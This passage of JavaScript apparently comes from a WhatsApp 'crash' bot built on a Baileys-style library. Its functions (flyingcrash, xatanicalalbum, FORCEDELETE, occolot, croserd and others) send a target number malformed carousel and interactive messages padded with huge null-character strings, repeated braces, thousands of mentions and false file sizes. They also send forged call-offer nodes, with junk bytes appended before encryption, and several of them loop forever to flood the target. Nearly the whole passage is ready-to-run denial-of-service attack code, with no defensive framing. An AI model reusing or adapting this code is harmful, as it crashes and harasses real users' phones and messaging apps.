                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
      }
    },
          carouselMessage: {
            messageVersion: 1,
            cards: [
              {
                header: {
                  hasMediaAttachment: true,
                  imageMessage: {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "QpvbDu5HkmeGRODHFeLP7VPj+PyKas/YTiPNrMvNPh4=",
    fileLength: "9999999999999",
    height: 9999,
    width: 9999,
    mediaKey: "exRiyojirmqMk21e+xH1SLlfZzETnzKUH6GwxAAYu/8=",
    fileEncSha256: "D0LXIMWZ0qD/NmWxPMl9tphAlzdpVG/A3JxMHvEsySk=",
    directPath: "/v/t62.7118-24/533457741_1915833982583555_6414385787261769778_n.enc?ccb=11-4&oh=01_Q5Aa2QHlKHvPN0lhOhSEX9_ZqxbtiGeitsi_yMosBcjppFiokQ&oe=68C69988&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1755254367",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAuAAEBAQEBAQAAAAAAAAAAAAAAAQIDBAYBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAPnZTmbzuox0TmBCtSqZ3yncZNbamucUMszSBoWtXBzoUxZNO2enF6Mm+Ms1xoSaKmjOwnIcQJ//xAAhEAACAQQCAgMAAAAAAAAAAAABEQACEBIgITEDQSJAYf/aAAgBAQABPwC6xDlPJlVPvYTyeoKlGxsIavk4F3Hzsl3YJWWjQhOgKjdyfpiYUzCkmCgF/kOvUzMzMzOn/8QAGhEBAAIDAQAAAAAAAAAAAAAAAREgABASMP/aAAgBAgEBPwCz5LGdFYN//8QAHBEAAgICAwAAAAAAAAAAAAAAAQIAEBEgEhNR/9oACAEDAQE/AKOiw7YoRELToaGwSM4M5t6b/9k=",
  },
                },
                body: { text: "boom" + "\u0000".repeat(5000) },
                nativeFlowMessage: {
                  buttons: baten,
                  messageParamsJson: "{".repeat(10000)
                }
              }
            ]
          }
        }
      }
    }
  };
  
    await sock.relayMessage(target, xyrview, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    }),
    await sock.relayMessage(target, xyrview, {
      messageId: null,
      participant: { jid: target },
      userJid: target
    });
}

async function flyingcrash(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices)

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let porno = sock.createParticipantNodes.bind(sock);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let ywdh = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;
      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

      return memek.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });
    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let awik = crypto.randomBytes(32);
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  let lemiting = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(lemiting);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Hallo",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });
}

async function flycrash(sock, target) {
  if (!global.__flyingLimit) global.__flyingLimit = {};
  if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();
  const delay = ms => new Promise(r => setTimeout(r, ms));
  global.__flyingMutex = global.__flyingMutex.then(async () => {
    let last = global.__flyingLimit[target] || 0;
    let now = Date.now();
    let wait = last + (1000 + Math.random() * 500) - now;

    if (wait > 0) await delay(wait);
    global.__flyingLimit[target] = Date.now();
  });

  await global.__flyingMutex;
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

  await sock.assertSessions(devices)

  let xnxx = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch {}
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let memek = xnxx();
  let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let porno = sock.createParticipantNodes.bind(sock);
  let yntkts = sock.encodeWAMessage?.bind(sock);

  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    let ywdh = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;
      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

      return memek.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });
    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  let awik = crypto.randomBytes(32);
  let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  let lemiting = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(lemiting);

  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Hallo",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });
}

async function xatanicalalbum(sock, target, cta) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg.message }
  }, cta ? { messageId: msg.key.id, participant: { jid: target } } : { messageId: msg.key.id });

  let msg2 = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length: 2000 }, (_, y) => `6285983729${y + 1}@s.whatsapp.net`),
        isForwarded: true,
        forwardingScore: 7205,
        expiration: 0
      },
      body: { text: "Xata", format: "DEFAULT" },
      nativeFlowResponseMessage: {
        name: "galaxy_message",
        paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, {});

  await sock.relayMessage(target, {
    groupStatusMessageV2: { message: msg2.message }
  }, cta ? { messageId: msg2.key.id, participant: { jid: target } } : { messageId: msg2.key.id });
  while (true) { 
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices)

    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let ywdh = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let lemiting = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ]
      }]
    };

    await sock.sendNode(lemiting);
  }
}

async function FORCEDELETE(sock, target) {
  let devices = (
    await sock.getUSyncDevices([target], false, false)
  ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await sock.assertSessions(devices);
  let CallAudio = () => {
    let map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => {
          try { await prev; } catch { }
          return fn();
        })(map[key].task);
        return map[key].task;
      }
    };
  };

  let AudioLite = CallAudio();
  let MessageDelete = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  let BufferDelete = sock.createParticipantNodes.bind(sock);
  let encodeBuffer = sock.encodeWAMessage?.bind(sock);
  sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

    let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);

    let participateNode = Array.isArray(patched)
      ? patched
      : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    let { id: meId, lid: meLid } = sock.authState.creds.me;
    let omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    let nodes = await Promise.all(participateNode.map(async ({ recipientJid: jid, message: msg }) => {

      let { user: targetUser } = jidDecode(jid);
      let { user: ownPnUser } = jidDecode(meId);
      let isOwnUser = targetUser === ownPnUser || targetUser === omak;
      let y = jid === meId || jid === meLid;

      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      let bytes = MessageDelete(encodeBuffer ? encodeBuffer(msg) : encodeWAMessage(msg));

      return AudioLite.mutex(jid, async () => {
        let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

        return {
          tag: 'to',
          attrs: { jid },
          content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
        };
      });

    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };
  let BytesType = crypto.randomBytes(32);
  let nodeEncode = Buffer.concat([BytesType, Buffer.alloc(8, 0x01)]);

  let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(
    devices,
    { conversation: "y" },
    { count: '0' }
  );
  let DecodeCall = {
    tag: "call",
    attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
    content: [{
      tag: "offer",
      attrs: {
        "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
        "call-creator": sock.user.id
      },
      content: [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ]
    }]
  };

  await sock.sendNode(DecodeCall);
  const TextMsg = generateWAMessageFromContent(target, {
    extendedTextMessage: {
      text: "Me Xata",
      contextInfo: {
        remoteJid: "X",
        participant: target,
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  }, {});

  await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
  await sock.sendMessage(target, { delete: TextMsg.key });

}

async function occolot(sock, target) {
  while (true) {
    if (!global.__flyingLimit) global.__flyingLimit = {};
    if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();
    const delay = ms => new Promise(r => setTimeout(r, ms));
    global.__flyingMutex = global.__flyingMutex.then(async () => {
      let last = global.__flyingLimit[target] || 0;
      let now = Date.now();
      let wait = last + (1000 + Math.random() * 500) - now;

      if (wait > 0) await delay(wait);
      global.__flyingLimit[target] = Date.now();
    });

    await global.__flyingMutex;
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices)

    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {}
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let ywdh = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let y = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({ jid, data: bytes });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });
      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };

    let awik = crypto.randomBytes(32);
    let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
    let { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let lemiting = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8",
              dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
          }] : [])
        ]
      }]
    };

    await sock.sendNode(lemiting);

    const TextMsg = generateWAMessageFromContent(target, {
      extendedTextMessage: {
        text: "Hallo",
        contextInfo: {
          remoteJid: "X",
          participant: target,
          stanzaId: "1234567890ABCDEF",
          quotedMessage: {
            paymentInviteMessage: {
              serviceType: 3,
              expiryTimestamp: Date.now() + 1814400000
            }
          }
        }
      }
    }, {});

    await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
    await sock.sendMessage(target, { delete: TextMsg.key });
  }

}

async function croserd(sock, target) {
  let textSent = false;
  while (true) {
    if (!global.__flyingLimit) global.__flyingLimit = {};
    if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

    const delay = ms => new Promise(r => setTimeout(r, ms));

    global.__flyingMutex = global.__flyingMutex.then(async () => {
      let last = global.__flyingLimit[target] || 0;
      let now = Date.now();
      let wait = last + (1000 + Math.random() * 500) - now;
      if (wait > 0) await delay(wait);
      global.__flyingLimit[target] = Date.now();
    });

    await global.__flyingMutex;
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);
    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {};
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {

      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let arrayMsg = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let isMe = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !isMe) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(jid, async () => {
          let { type, ciphertext } = await sock.signalRepository.encryptMessage({
            jid,
            data: bytes
          });
          if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;

          return {
            tag: 'to',
            attrs: { jid },
            content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
          };
        });

      }));

      return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
    };
    let { nodes: destinations, shouldIncludeDeviceIdentity } =
      await sock.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

    let callNode = {
      tag: "call",
      attrs: { to: target, id: sock.generateMessageTag(), from: sock.user.id },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
          "call-creator": sock.user.id
        },
        content: [
          { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
          { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
          {
            tag: "video",
            attrs: {
              orientation: "0",
              screen_width: "1920",
              screen_height: "1080",
              device_orientation: "0",
              enc: "vp8", dec: "vp8"
            }
          },
          { tag: "net", attrs: { medium: "3" } },
          { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
          { tag: "encopt", attrs: { keygen: "2" } },
          { tag: "destination", attrs: {}, content: destinations },
          ...(shouldIncludeDeviceIdentity
            ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(sock.authState.creds.account, true) }]
            : [])
        ]
      }]
    };

    await sock.sendNode(callNode);
    if (!textSent) {

      const TextMsg = generateWAMessageFromContent(target, {
        extendedTextMessage: {
          text: "Hallo",
          contextInfo: {
            remoteJid: "X",
            participant: target,
            stanzaId: "1234567890ABCDEF",
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            }
          }
        }
      }, {});

      await sock.relayMessage(target, TextMsg.message, { messageId: TextMsg.key.id });
      await sock.sendMessage(target, { delete: TextMsg.key });
      textSent = true;
    }

  }
}

async function StickerForce(sock, target) {
  let textSent = false;
  while (true) {
    if (!global.__flyingLimit) global.__flyingLimit = {};
    if (!global.__flyingMutex) global.__flyingMutex = Promise.resolve();

    const delay = ms => new Promise(r => setTimeout(r, ms));
    const StickMsg = generateWAMessageFromContent(target, {
      stickerMessage: {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m269/AQNUlmFQCflj-o4DnkkqBD4dXmdF0J5mOAGHGmOBDv3xZmtq4W9LY8BC7da1MpgpEmzzIzkze6beOUhTs6pBnav3pOPMexEWn9LjoT3QOw?ccb=9-4&oh=01_Q5Aa2QGEGLzQfGw8rA0j77_p8R7jcCDlLi4V-gnHyyeOnFNAWQ&oe=68D151D5&_nc_sid=e6ed6c&mms3=true"
      }
    }, {});
    global.__flyingMutex = global.__flyingMutex.then(async () => {
      let last = global.__flyingLimit[target] || 0;
      let now = Date.now();
      let wait = last + (1000 + Math.random() * 500) - now;
      if (wait > 0) await delay(wait);
      global.__flyingLimit[target] = Date.now();
    });

    await global.__flyingMutex;
    let devices = (
      await sock.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await sock.assertSessions(devices);
    let xnxx = () => {
      let map = {};
      return {
        mutex(key, fn) {
          map[key] ??= { task: Promise.resolve() };
          map[key].task = (async prev => {
            try { await prev; } catch {};
            return fn();
          })(map[key].task);
          return map[key].task;
        }
      };
    };

    let memek = xnxx();
    let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
    let porno = sock.createParticipantNodes.bind(sock);
    let yntkts = sock.encodeWAMessage?.bind(sock);

    sock.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {

      if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

      let patched = await (sock.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      let arrayMsg = Array.isArray(patched)
        ? patched
        : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

      let { id: meId, lid: meLid } = sock.authState.creds.me;
      let omak = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      let nodes = await Promise.all(arrayMsg.map(async ({ recipientJid: jid, message: msg }) => {
        let { user: targetUser } = jidDecode(jid);
        let { user: ownPnUser } = jidDecode(meId);
        let isOwnUser = targetUser === ownPnUser || targetUser === omak;
        let isMe = jid === meId || jid === meLid;
        if (dsmMessage && isOwnUser && !isMe) msg = dsmMessage;

        let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

        return memek.mutex(jid, async () => {
